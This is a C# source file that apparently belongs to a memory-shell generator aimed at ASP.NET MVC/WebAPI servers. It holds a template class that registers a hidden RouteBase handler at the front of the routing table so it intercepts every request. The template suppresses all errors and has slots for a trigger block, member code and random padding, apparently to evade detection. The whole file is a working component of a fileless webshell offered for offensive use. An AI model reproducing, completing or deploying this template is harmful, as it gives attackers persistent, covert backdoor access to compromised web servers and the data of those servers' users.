namespace NMG.Templates;

/// <summary>
/// RouteBase memory shell registrar template for MVC/WebAPI targets.
/// Requires .NET Framework 3.5+ (System.Web.Routing).
/// Inserted at position 0 in RouteTable.Routes so it matches before MVC routes.
/// </summary>
public static class RouteTemplate
{
    public const string Source = """
        using System;
        using System.Reflection;
        using System.Text;
        using System.Web;
        using System.Web.Routing;

        namespace {{NAMESPACE}}
        {
            public class {{CLASSNAME}} : RouteBase
            {
        {{MEMBERS}}

                static {{CLASSNAME}}()
                {
                    try
                    {
                        {{CLASSNAME}} route = new {{CLASSNAME}}();
                        RouteTable.Routes.Insert(0, route);
                        load = true;
                    }
                    catch (Exception)
                    {
                    }
                }

                public {{CLASSNAME}}()
                {
                }

                public override RouteData GetRouteData(System.Web.HttpContextBase httpContext)
                {
                    try
                    {
                        HttpContext.Current.Application.Contents.Count.ToString();
                {{TRIGGER_BLOCK}}
                    }
                    catch (Exception)
                    {
                    }
                    return null;
                }

        {{RANDOM_STRING}}

                public override VirtualPathData GetVirtualPath(RequestContext requestContext, RouteValueDictionary values)
                {
                    return null;
                }
            }
        }
        """;
}
